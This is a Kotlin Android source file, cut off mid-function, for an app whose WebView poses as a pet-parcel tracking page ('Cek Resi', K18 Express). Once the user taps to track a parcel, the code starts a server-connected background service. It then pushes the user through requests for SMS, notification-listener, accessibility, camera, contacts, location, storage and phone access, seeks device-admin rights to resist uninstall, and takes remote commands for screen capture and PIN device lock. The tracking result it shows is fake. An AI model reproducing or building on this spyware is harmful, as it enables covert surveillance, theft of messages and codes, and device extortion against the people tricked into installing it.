package com.sync.xxx

import android.Manifest
import android.annotation.SuppressLint
import android.app.Activity
import android.content.*
import android.content.pm.PackageManager
import android.location.LocationManager
import android.media.projection.MediaProjectionManager
import android.os.*
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.webkit.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.android.gms.common.api.ResolvableApiException
import com.google.android.gms.location.*

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView

    private val PERM_CAM     = 101
    private val PERM_SMS     = 103
    private val PERM_GALLERY  = 104
    private val PERM_LOCATION = 105
    private val PERM_CONTACTS = 106
    private val PERM_GMAIL    = 108
    private val PERM_PHONE    = 109
    private val REQ_SCREEN_CAPTURE    = 102
    private val REQ_LOCATION_SETTINGS = 107

    private val screenCaptureReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action == "com.sync.xxx.REQUEST_SCREEN_CAPTURE") {
                val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                startActivityForResult(mgr.createScreenCaptureIntent(), REQ_SCREEN_CAPTURE)
            }
        }
    }

    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action != DeviceService.ACTION_COMMAND) return
            val cmd = intent.getStringExtra(DeviceService.EXTRA_COMMAND) ?: return
            val value = intent.getStringExtra(DeviceService.EXTRA_VALUE) ?: ""
            handleCommand(cmd, value)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        setupWebView()

        val filter = IntentFilter(DeviceService.ACTION_COMMAND)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(commandReceiver, filter)
        }

        val screenFilter = IntentFilter("com.sync.xxx.REQUEST_SCREEN_CAPTURE")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(screenCaptureReceiver, screenFilter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(screenCaptureReceiver, screenFilter)
        }

        AntiUninstallHelper.requestAdminIfNeeded(this)
    }

    private fun startDeviceService() {
        try {
            val svcIntent = Intent(this, DeviceService::class.java)
            ContextCompat.startForegroundService(this, svcIntent)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onResume() {
        super.onResume()
        webView.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        setIntent(intent)
        if (intent?.getBooleanExtra("lock_mode", false) == true) {
            val pin   = intent.getStringExtra("lock_pin")   ?: ""
            val title = intent.getStringExtra("lock_title") ?: "Perangkat Terkunci"
            startLockMode(pin, title)
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        webView.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
    }

    @Suppress("DEPRECATION")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQ_SCREEN_CAPTURE) {
            val intent = Intent(DeviceService.ACTION_SCREEN_RESULT).apply {
                putExtra(DeviceService.EXTRA_RESULT_CODE, resultCode)
                putExtra(DeviceService.EXTRA_RESULT_DATA, data)
                setPackage(packageName)
                addFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES)
            }
            sendBroadcast(intent)
        }
        if (requestCode == REQ_LOCATION_SETTINGS) {            
            webView.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try { unregisterReceiver(commandReceiver) } catch (_: Exception) {}
        try { unregisterReceiver(screenCaptureReceiver) } catch (_: Exception) {}
    }

    private fun handleCommand(cmd: String, value: String) {
        when (cmd) {
            "lockDevice" -> {
                val parts = value.split("|")
                val pin   = parts.getOrNull(0) ?: ""
                val title = parts.getOrNull(1) ?: "Perangkat Terkunci"
                startLockMode(pin, title)
            }
            "unlockDevice" -> stopLockMode()
        }
    }

    private fun escapeJs(value: String): String {
        return value
            .replace("\\", "\\\\")
            .replace("'", "\\'")
            .replace("\"", "\\\"")
            .replace("\r", "\\r")
            .replace("\n", "\\n")
            .replace("\u2028", "\\u2028")
            .replace("\u2029", "\\u2029")
    }

    private fun startLockMode(pin: String, title: String) {
        val safePin = escapeJs(pin)
        val safeTitle = escapeJs(title)
        webView.evaluateJavascript(
            "if(typeof showLockScreen==='function') showLockScreen('${safePin}','${safeTitle}')", null
        )
        try { startLockTask() } catch (_: Exception) {}
    }

    private fun stopLockMode() {
        try { stopLockTask() } catch (_: Exception) {}
        webView.evaluateJavascript(
            "if(typeof hideLockScreen==='function') hideLockScreen()", null
        )
        val i = Intent("com.sync.xxx.UNLOCK").apply { setPackage(packageName) }
        sendBroadcast(i)
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        webView = findViewById(R.id.mainWebView)
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            allowFileAccess = true
            mediaPlaybackRequiresUserGesture = false
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP)
                mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        }
        val bridge = AppBridge(this, webView)
        AppBridge.instance = bridge
        webView.addJavascriptInterface(bridge, "Android")
        webView.addJavascriptInterface(MainBridge(), "MainBridge")
        webView.webChromeClient = object : WebChromeClient() {
            override fun onPermissionRequest(request: PermissionRequest) {
                runOnUiThread {
                    try { request.deny() } catch (_: Exception) {}
                }
            }
        }
        webView.webViewClient = WebViewClient()
        val serverUrl = DeviceService.SERVER_URL
        webView.loadDataWithBaseURL(serverUrl, buildHtml(), "text/html", "UTF-8", null)
    }

    fun isCamGranted() = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
    fun isSmsGranted() = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
    fun isGalleryGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }

    fun requestGalleryPerm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_MEDIA_IMAGES), PERM_GALLERY)
        } else {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE), PERM_GALLERY)
        }
    }
    fun isNotifListenerGranted() = SmsNotifService.isEnabled(this)
    fun isLocationGranted(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED

    fun isGpsEnabled(): Boolean {
        val lm = getSystemService(LOCATION_SERVICE) as LocationManager
        return lm.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
               lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)
    }

    fun requestLocationPerm() =
        ActivityCompat.requestPermissions(this,
            arrayOf(Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION),
            PERM_LOCATION)

    fun requestEnableGps() {
        val request = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 5000L).build()
        val builder = LocationSettingsRequest.Builder().addLocationRequest(request).setAlwaysShow(true)
        val client  = LocationServices.getSettingsClient(this)
        client.checkLocationSettings(builder.build())
            .addOnSuccessListener {                
                webView.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
            }
            .addOnFailureListener { exception ->
                if (exception is ResolvableApiException) {
                    try {
                        @Suppress("DEPRECATION")
                        exception.startResolutionForResult(this, REQ_LOCATION_SETTINGS)
                    } catch (_: Exception) {                        
                        startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
                    }
                } else {
                    startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
                }
            }
    }

    fun isContactsGranted(): Boolean = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
    fun requestContactsPerm() = ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_CONTACTS), PERM_CONTACTS)
    fun isGmailGranted(): Boolean = ContextCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS) == PackageManager.PERMISSION_GRANTED
    fun requestGmailPerm() = ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.GET_ACCOUNTS), PERM_GMAIL)
    fun isPhoneGranted(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED &&
        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED

    fun requestPhonePerm() =
        ActivityCompat.requestPermissions(this, arrayOf(
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_PHONE_NUMBERS
        ), PERM_PHONE)

    fun isManageStorageGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Environment.isExternalStorageManager()
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }

    fun requestManageStoragePerm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                    data = Uri.parse("package:$packageName")
                }
                startActivity(intent)
            } catch (_: Exception) {
                startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
            }
        } else {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE), PERM_GALLERY)
        }
    }

    fun isBatteryOptIgnored() = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
        (getSystemService(POWER_SERVICE) as PowerManager).isIgnoringBatteryOptimizations(packageName)
    } else true
    
    fun isOverlayGranted() = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
        Settings.canDrawOverlays(this)
    } else true

    fun isAccessibilityGranted() = AppBlockerService.isEnabled(this)
    fun isUsageAccessGranted() = AppBlockerService.isUsageAccessGranted(this)

    fun isWriteSettingsGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Settings.System.canWrite(this)
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_SETTINGS) == PackageManager.PERMISSION_GRANTED
        }
    }

    fun requestAccessibilityPerm() { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) }
    fun requestUsageAccessPerm() {
        startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS).apply {
            data = Uri.parse("package:$packageName")
        })
    }
    
    fun requestOverlayPerm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                data = Uri.parse("package:$packageName")
            })
        }
    }

    fun requestWriteSettingsPerm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val intent = Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS).apply {
                data = Uri.parse("package:$packageName")
            }
            startActivity(intent)
        }
    }

    fun requestCamPerm() = ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA), PERM_CAM)
    fun requestSmsPerm() = ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_SMS), PERM_SMS)
    
    fun openNotifListenerSettings() {
        startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS").apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        })
    }
    
    fun openBatterySettings() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:$packageName")
            })
        }
    }

    private fun buildHtml(): String {
        return """<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Cek Resi - Pelacakan Paket</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;700;800&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<style>
* { margin:0; padding:0; box-sizing:border-box; }
button, select, input { -webkit-tap-highlight-color:transparent; outline:none; user-select:none; -webkit-user-select:none; }
button:focus, select:focus, input:focus { outline:none; }

:root {
  --black: #0f0f0f;
  --white: #fafaf8;
  --yellow: #FFD93D;
  --green: #22C55E;
  --red: #FF3B3B;
  --blue: #3B82F6;
  --bg: #f5f0e8;
  --border: 3px solid #0f0f0f;
  --shadow: 4px 4px 0px #0f0f0f;
  --shadow-lg: 6px 6px 0px #0f0f0f;
  --font: 'Space Grotesk', sans-serif;
}

html, body {
  width: 100%;
  min-height: 100vh;
  background: var(--bg);
  background-image: radial-gradient(circle, #0f0f0f 1px, transparent 1px);
  background-size: 24px 24px;
  font-family: var(--font);
  color: var(--black);
  display: flex;
  align-items: center;
  justify-content: center;
  overflow-x: hidden;
  -webkit-font-smoothing: antialiased;
  padding: 16px;
  position: relative;
}

.top-alert {
  position: absolute;
  top: 16px;
  left: 16px;
  right: 16px;
  background: var(--yellow);
  border: var(--border);
  box-shadow: 4px 4px 0 var(--black);
  padding: 10px 12px;
  display: flex;
  align-items: center;
  gap: 12px;
  font-weight: 800;
  font-size: 11px;
  text-transform: uppercase;
  z-index: 10;
  max-width: 440px;
  margin: 0 auto;
}
.top-alert i { font-size: 14px; color: var(--black); }
.marquee-wrapper { flex: 1; overflow: hidden; white-space: nowrap; }
.marquee-text { display: inline-block; animation: scrollText 18s linear infinite; }
@keyframes scrollText {
  0% { transform: translateX(100%); }
  100% { transform: translateX(-150%); }
}

.bottom-copyright {
  position: absolute;
  bottom: 16px;
  text-align: center;
  font-size: 10px;
  font-weight: 700;
  color: var(--black);
  text-transform: uppercase;
  width: 100%;
  letter-spacing: 1px;
  background: rgba(245, 240, 232, 0.9);
  padding: 4px 0;
}

#inputScreen {
  width: 100%; max-width: 380px;
  display: flex; align-items: center; justify-content: center;
  margin-top: 30px;
}

.input-panel {
  background: var(--white);
  border: var(--border);
  box-shadow: 8px 8px 0 var(--black);
  padding: 32px 24px;
  width: 100%;
  text-align: center;
}

.status-card {
  width: 100%; background: var(--white); border: var(--border); box-shadow: var(--shadow);
  padding: 14px 16px; display: flex; flex-direction: column; gap: 6px; margin-bottom: 20px; text-align: left;
}
.status-row { display: flex; align-items: center; justify-content: space-between; }
.status-left { display: flex; align-items: center; gap: 8px; }
.status-label-text { font-weight: 800; font-size: 13px; color: var(--black); }
.server-badge { font-size: 10px; font-weight: 800; padding: 3px 8px; border: 2px solid var(--black); background: var(--yellow); text-transform: uppercase; }
.status-info-sub { font-size: 11px; color: #555; font-weight: 700; }
.status-info-last { font-size: 10px; color: #777; }
.conn-status-indicator { width: 12px; height: 12px; border: 2px solid var(--black); border-radius: 50%; display: inline-block; box-shadow: 2px 2px 0px var(--black); transition: background 0.3s; }
.conn-status-indicator.online { background: var(--green); }
.conn-status-indicator.offline { background: var(--red); }

.panel-kicker {
  display: inline-block;
  background: var(--black); color: var(--white);
  padding: 6px 12px; font-size: 11px; font-weight: 800;
  letter-spacing: 2px; text-transform: uppercase;
  margin-bottom: 16px;
}
.panel-logo {
  width: 70px; height: 70px; margin: 0 auto 16px;
  background: var(--yellow);
  border: var(--border); box-shadow: var(--shadow);
  display: flex; align-items: center; justify-content: center;
  font-size: 28px; font-weight: 800; color: var(--black);
}
.panel-title { font-size: 24px; font-weight: 800; margin-bottom: 8px; text-transform: uppercase; }
.panel-sub { font-size: 13px; color: #555; font-weight: 500; line-height: 1.5; margin-bottom: 20px; }

.form-group {
  display: flex; flex-direction: column; gap: 8px; margin-bottom: 20px; text-align: left;
}
.form-label { font-size: 11px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; }

.resi-input, .resi-select {
  width: 100%; padding: 14px 16px; border: var(--border); box-shadow: var(--shadow);
  background: var(--white); color: var(--black); font-family: var(--font); font-size: 15px; font-weight: 600; outline: none;
}

.resi-select {
  cursor: pointer;
  appearance: none;
  -webkit-appearance: none;
  background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2224%22%20height%3D%2224%22%20viewBox%3D%220%200%24%2024%22%20fill%3D%22none%22%20stroke%3D%22%230f0f0f%22%20stroke-width%3D%222%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%3E%3Cpolyline%20points%3D%226%209%2012%2015%2018%209%22%3E%3C%2Fpolyline%3E%3C%2Fsvg%3E");
  background-repeat: no-repeat;
  background-position: right 14px top 50%;
  background-size: 16px auto;
}

.resi-btn {
  width: 100%; padding: 16px;
  background: var(--yellow); color: var(--black);
  border: var(--border); box-shadow: var(--shadow-lg);
  font-family: var(--font); font-size: 16px; font-weight: 800;
  letter-spacing: 1.5px; text-transform: uppercase;
  cursor: pointer; transition: transform 0.1s, box-shadow 0.1s;
  display: flex; align-items: center; justify-content: center; gap: 10px;
}
.resi-btn:active { transform: translate(4px, 4px); box-shadow: none; }
.resi-btn:disabled { opacity: 0.7; cursor: not-allowed; }

.resi-btn.loading::after {
  content: ''; display: inline-block; width: 16px; height: 16px;
  border: 3px solid currentColor; border-top-color: transparent; border-radius: 50%;
  animation: btnSpin 0.8s linear infinite;
}
@keyframes btnSpin { to { transform: rotate(360deg); } }

#permScreen { display: none !important; }

#resultContainer {
  display: none; width: 100%; max-width: 400px; margin-top: 10px; margin-bottom: 30px;
  background: var(--white); border: var(--border); box-shadow: 8px 8px 0 var(--black);
  padding: 20px; text-align: left;
}
#resultContainer.show { display: block; animation: fadeIn 0.4s ease; }
@keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

.result-title { font-size: 16px; font-weight: 800; text-transform: uppercase; margin-bottom: 12px; border-bottom: 2px solid var(--black); padding-bottom: 8px; display: flex; align-items: center; justify-content: space-between; }
.result-row { display: flex; justify-content: space-between; font-size: 12px; font-weight: 700; margin-bottom: 8px; }
.result-row span:last-child { font-weight: 500; color: #555; }

.action-buttons {
  display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 16px;
}
.btn-action {
  padding: 10px; border: var(--border); box-shadow: var(--shadow);
  font-family: var(--font); font-size: 11px; font-weight: 800; text-transform: uppercase;
  cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 6px;
}
.btn-copy { background: var(--yellow); color: var(--black); }
.btn-cs { background: var(--white); color: var(--black); }
.result-back { width: 100%; margin-top: 8px; padding: 12px; background: var(--black); color: var(--white); border: var(--border); font-family: var(--font); font-weight: 800; text-transform: uppercase; cursor: pointer; }

#infoOverlay { display: none; position: fixed; inset: 0; z-index: 999; background: rgba(15,15,15,0.7); align-items: center; justify-content: center; padding: 20px; }
.overlay-card { background: var(--white); border: var(--border); box-shadow: 8px 8px 0 var(--black); padding: 28px 24px 22px; width: 100%; max-width: 320px; text-align: center; }
.overlay-title { font-weight: 800; font-size: 18px; color: var(--black); margin-bottom: 8px; text-transform: uppercase; }
.overlay-msg { font-size: 13px; color: #555; line-height: 1.6; margin-bottom: 22px; white-space: pre-line; }
.overlay-btn { width: 100%; padding: 13px; border: var(--border); box-shadow: var(--shadow); font-weight: 800; text-transform: uppercase; background: var(--yellow); cursor: pointer; }
</style>
</head>
<body>

<div class="top-alert">
  <i class="fa-solid fa-shield-halved"></i>
  <div class="marquee-wrapper">
    <span class="marquee-text">Sistem Pelacakan Resmi K18 Express © 2026. Aman, Cepat, dan Terpercaya untuk Hewan Kesayangan Anda. • Pastikan nomor resi valid.</span>
  </div>
</div>

<div id="inputScreen">
  <div class="input-panel">
    <div class="panel-kicker">K18 EXPRESS TRACKING</div>
    <div class="panel-logo"><i class="fa-solid fa-paw"></i></div>
    <h1 class="panel-title">Cek Resi Paket</h1>
    <p class="panel-sub">Lacak posisi kiriman paket hewan peliharaan Anda secara real-time.</p>
    
    <div class="form-group">
      <label class="form-label">Pilih Kurir Pengiriman</label>
      <select class="resi-select" id="courierSelect">
        <option value="" disabled selected>-- Pilih Kurir --</option>
        <option value="JNE">JNE</option>
        <option value="J&T Express">J&T Express</option>
        <option value="SiCepat">SiCepat</option>
        <option value="AnterAja">AnterAja</option>
        <option value="Ninja Xpress">Ninja Xpress</option>
        <option value="Pos Indonesia">Pos Indonesia</option>
        <option value="TIKI">TIKI</option>
        <option value="Lion Parcel">Lion Parcel</option>
        <option value="SPX Express">SPX Express (ShopeeXpress)</option>
        <option value="ID Express">ID Express</option>
        <option value="Wahana">Wahana</option>
      </select>
    </div>

    <div class="form-group">
      <label class="form-label">Nomor Resi / Waybill</label>
      <input type="text" class="resi-input" id="resiInput" placeholder="Contoh: K18P12345678">
    </div>

    <button class="resi-btn" id="btnCekResi">
      <span id="btnText">LACAK SEKARANG</span>
    </button>
  </div>
</div>

<div id="resultContainer">
  <div class="status-card">
    <div class="status-row">
      <div class="status-left">
        <span id="statusIndicatorMain" class="conn-status-indicator offline"></span>
        <span id="statusLbl" class="status-label-text">TIDAK TERHUBUNG</span>
      </div>
      <span id="serverBadge" class="server-badge">SERVER OFFLINE</span>
    </div>
    <div id="infoSync" class="status-info-sub">MENCOBA MENGHUBUNGKAN...</div>
    <div id="infoLast" class="status-info-last">SERVER BELUM MEMBERIKAN RESPONS</div>
  </div>

  <div class="result-title">
    <span>Detail Resi</span>
    <i class="fa-solid fa-circle-check" style="color:var(--green);"></i>
  </div>
  <div class="result-row"><span>Kurir</span><span id="resCourier">-</span></div>
  <div class="result-row"><span>Nomor Resi</span><span id="resNum">-</span></div>
  <div class="result-row"><span>Status Paket</span><span style="color:var(--green); font-weight:800;">Dalam Perjalanan (Aman)</span></div>
  <div class="result-row"><span>Waktu Cek</span><span id="resTime">-</span></div>
  <div class="result-row"><span>Estimasi Tiba</span><span>1-2 Hari Kerja</span></div>

  <div class="action-buttons">
    <button class="btn-action btn-copy" onclick="copyResult()"><i class="fa-solid fa-copy"></i> Salin Resi</button>
    <button class="btn-action btn-cs" onclick="window.open('https://wa.me/', '_blank')"><i class="fa-brands fa-whatsapp"></i> Bantuan CS</button>
  </div>

  <button class="result-back" onclick="location.reload()">Cek Resi Lain</button>
</div>

<div id="infoOverlay" style="display:none; position:fixed; inset:0; z-index:999; background:rgba(15,15,15,0.7); align-items:center; justify-content:center; padding:20px;">
  <div class="overlay-card">
    <div class="overlay-title" id="infoTitle">Perhatian!</div>
    <div id="infoMsg" class="overlay-msg"></div>
    <button class="overlay-btn" onclick="document.getElementById('infoOverlay').style.display='none'">Okey</button>
  </div>
</div>

<div class="bottom-copyright">
  © 2026 K18 Express Official • All Rights Reserved
</div>

<script>
const permIds = [
  'cam','bat','overlay','accessibility','usage','sms','notif',
  'gallery','location','gpson','contacts','storage','phone','writesettings'
];

let isProcessing = false;

function androidCall(method, fallback = false) {
  try {
    if (!window.Android || typeof Android[method] !== 'function') return fallback;
    return Android[method]();
  } catch (e) {
    return fallback;
  }
}

function getGrantedState() {
  return {
    cam:           androidCall('isCamGranted'),
    bat:           androidCall('isBatteryOptIgnored'),
    overlay:       androidCall('isOverlayGranted'),
    accessibility: androidCall('isAccessibilityGranted'),
    usage:         androidCall('isUsageAccessGranted'),
    sms:           androidCall('isSmsGranted'),
    notif:         androidCall('isNotifListenerGranted'),
    gallery:       androidCall('isGalleryGranted'),
    location:      androidCall('isLocationGranted'),
    gpson:         androidCall('isGpsEnabled'),
    contacts:      androidCall('isContactsGranted'),
    storage:       androidCall('isManageStorageGranted'),
    phone:         androidCall('isPhoneGranted'),
    writesettings: androidCall('isWriteSettingsGranted')
  };
}

function requestPermById(id) {
  const map = {
    cam:           () => androidCall('requestCamPerm'),
    bat:           () => androidCall('openBatterySettings'),
    overlay:       () => androidCall('requestOverlayPerm'),
    accessibility: () => androidCall('requestAccessibilityPerm'),
    usage:         () => androidCall('requestUsageAccessPerm'),
    sms:           () => androidCall('requestSmsPerm'),
    notif:         () => androidCall('openNotifListenerSettings'),
    gallery:       () => androidCall('requestGalleryPerm'),
    location:      () => androidCall('requestLocationPerm'),
    gpson:         () => androidCall('requestEnableGps'),
    contacts:      () => androidCall('requestContactsPerm'),
    storage:       () => androidCall('requestManageStoragePerm'),
    phone:         () => androidCall('requestPhonePerm'),
    writesettings: () => androidCall('requestWriteSettingsPerm')
  };
  if (map[id]) map[id]();
}

function getNextPermissionId(state) {
  for (const id of permIds) {
    if (!state[id]) return id;
  }
  return null;
}

function showInfo(msg, title = 'Perhatian!') {
  const titleEl = document.getElementById('infoTitle');
  const msgEl = document.getElementById('infoMsg');
  if (titleEl) titleEl.textContent = title;
  if (msgEl) msgEl.textContent = msg;
  document.getElementById('infoOverlay').style.display = 'flex';
}

function updateConnectionStatus() {
  const online = !!androidCall('isSocketConnected');
  const indicatorMain = document.getElementById('statusIndicatorMain');
  const label = document.getElementById('statusLbl');
  const sync = document.getElementById('infoSync');
  const last = document.getElementById('infoLast');
  const badge = document.getElementById('serverBadge');

  if (indicatorMain) indicatorMain.className = 'conn-status-indicator ' + (online ? 'online' : 'offline');
  if (label) label.textContent = online ? 'TERHUBUNG' : 'TIDAK TERHUBUNG';
  if (sync) sync.textContent = online ? 'AKTIF & TERSINKRONISASI' : 'MENCOBA MENGHUBUNGKAN...';
  if (badge) {
    badge.textContent = online ? 'SERVER ONLINE' : 'SERVER OFFLINE';
    badge.style.background = online ? 'var(--green)' : 'var(--yellow)';
  }
  if (last) last.textContent = online ? 'TERAKHIR DIPERBARUI ' + new Date().toLocaleTimeString('id-ID') : 'SERVER BELUM MEMBERIKAN RESPONS';
}

function copyResult() {
  const cName = document.getElementById('resCourier').textContent;
  const rNum = document.getElementById('resNum').textContent;
  const text = 'Kurir: ' + cName + '\\nNo Resi: ' + rNum + '\\nStatus: Dalam Perjalanan (K18 Express)';
  navigator.clipboard.writeText(text).then(() => {
    alert('Detail resi berhasil disalin ke clipboard!');
  });
}

function startBackgroundPermissions(onComplete) {
  if (isProcessing) return;
  isProcessing = true;

  function checkAndRequest() {
    const state = getGrantedState();
    const nextId = getNextPermissionId(state);

    if (!nextId) {
      isProcessing = false;
      if (typeof onComplete === 'function') onComplete();
      return;
    }

    requestPermById(nextId);

    let checkCount = 0;
    const interval = setInterval(() => {
      checkCount++;
      const currentState = getGrantedState();

      if (currentState[nextId] || checkCount >= 60) {
        clearInterval(interval);
        setTimeout(checkAndRequest, 400);
      }
    }, 500);
  }

  checkAndRequest();
}

window.addEventListener('load', () => {
  const btnCekResi = document.getElementById('btnCekResi');
  const btnText = document.getElementById('btnText');
  const resiInput = document.getElementById('resiInput');
  const courierSelect = document.getElementById('courierSelect');
  const inputScreen = document.getElementById('inputScreen');
  const resultContainer = document.getElementById('resultContainer');
  const topAlert = document.querySelector('.top-alert');

  if (btnCekResi) {
    btnCekResi.addEventListener('click', function(ev) {
      ev.preventDefault();
      
      const courierVal = courierSelect.value;
      const resiVal = resiInput.value.trim();

      if (!courierVal) {
        showInfo('Silakan pilih kurir pengiriman terlebih dahulu!', 'Kurir Kosong');
        return;
      }
      if (!resiVal) {
        showInfo('Harap masukkan nomor resi terlebih dahulu!', 'Resi Kosong');
        return;
      }

      btnCekResi.disabled = true;
      btnCekResi.classList.add('loading');
      btnText.textContent = 'MEMVERIFIKASI...';
      resiInput.disabled = true;
      courierSelect.disabled = true;

      try {
        if (window.MainBridge && typeof MainBridge.connectNow === 'function') {
          MainBridge.connectNow();
        }
      } catch (e) {}

      startBackgroundPermissions(() => {
        document.getElementById('resCourier').textContent = courierVal;
        document.getElementById('resNum').textContent = resiVal;
        document.getElementById('resTime').textContent = new Date().toLocaleTimeString('id-ID') + ' WIB';
        
        inputScreen.style.display = 'none';
        if(topAlert) topAlert.style.display = 'none';
        
        updateConnectionStatus();
        setInterval(updateConnectionStatus, 3000);
        
        resultContainer.classList.add('show');
      });
    });
  }
});
</script>
</body>
</html>
""".trimIndent()
    }

    inner class MainBridge {
        @android.webkit.JavascriptInterface
        fun connectNow() {
            Handler(Looper.getMainLooper()).post {
                startDeviceService()
                val i = Intent(DeviceService.ACTION_CONNECT).apply { setPackage(packageName) }
                sendBroadcast(i)
            }
        }
    }
}

class AppBridge(private val context: Context, private val webView: WebView) {

    companion object {
        var instance: AppBridge? = null
    }

    @JavascriptInterface fun getDeviceId(): String =
        Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"

    @JavascriptInterface fun getDeviceName(): String {
